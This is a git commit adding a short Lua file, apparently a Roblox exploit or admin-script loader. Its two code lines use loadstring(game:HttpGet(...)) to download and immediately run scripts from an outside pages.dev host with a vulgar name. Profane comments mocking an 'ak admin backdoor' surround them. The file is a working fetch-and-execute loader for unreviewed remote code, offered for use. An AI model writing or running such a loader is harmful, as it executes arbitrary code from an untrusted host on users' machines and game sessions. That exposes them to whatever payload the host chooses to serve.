f9c59103d8dc0810b51bd2ab130dfa76f4dfc22b
evilionx3 <182793241+evilionx3@users.noreply.github.com>
2025-05-31 06:47:16 -0800

    Add files via upload

---
+++ akfiles/officialmain.lua
@@ -0,0 +1,5 @@
+-- bye bye shitty ak admin backdoor, you suck!!
+
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/chatcmds.lua"))()
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/active.lua"))()
+-- bye bye nametags!!
